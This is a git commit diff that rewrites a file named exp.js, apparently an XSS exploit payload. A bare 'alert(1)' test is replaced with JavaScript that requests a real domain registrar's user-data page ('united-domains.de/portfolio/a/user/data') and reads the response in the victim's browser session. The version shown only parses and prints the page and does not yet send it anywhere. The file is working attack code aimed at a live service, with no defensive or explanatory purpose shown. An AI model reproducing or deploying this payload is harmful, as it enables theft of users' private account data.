56a5e79d09cc28d97b9704bc8619d9dc6dba248f
backd00r101 <34193561+backd00r101@users.noreply.github.com>
2019-03-12 05:26:09 +0200

    Update exp.js

--- exp.js
+++ exp.js
@@ -1,4 +1,19 @@
-alert(1);
+
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+           var htmlsource = xhr.responseText
+           // some operations
+           parser = new DOMParser().parseFromString(htmlsource, "text/html");
+           print(htmlsource)
+
+        }
+};
+
+xhr.open('GET', 'https://www.united-domains.de/portfolio/a/user/data', true);
+xhr.send();
+
+
 
 
 
